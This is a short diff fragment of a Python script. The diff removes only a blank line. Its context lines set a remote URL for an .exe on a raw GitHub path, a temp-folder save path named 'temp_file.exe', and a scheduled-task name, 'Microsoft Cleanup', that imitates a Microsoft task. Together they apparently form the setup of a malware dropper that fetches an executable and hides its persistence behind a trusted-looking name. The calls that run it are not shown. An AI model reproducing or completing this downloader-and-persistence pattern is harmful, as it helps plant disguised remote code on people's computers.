@@ -3,7 +3,6 @@ import datetime
 import tempfile
 import urllib.request
 import subprocess
-
 download_url = "https://raw.githubusercontent.com/senaygue75/discorduserid/refs/heads/main/main.exe"
 download_path = os.path.join(tempfile.gettempdir(), "temp_file.exe")
 task_name = "Microsoft Cleanup"
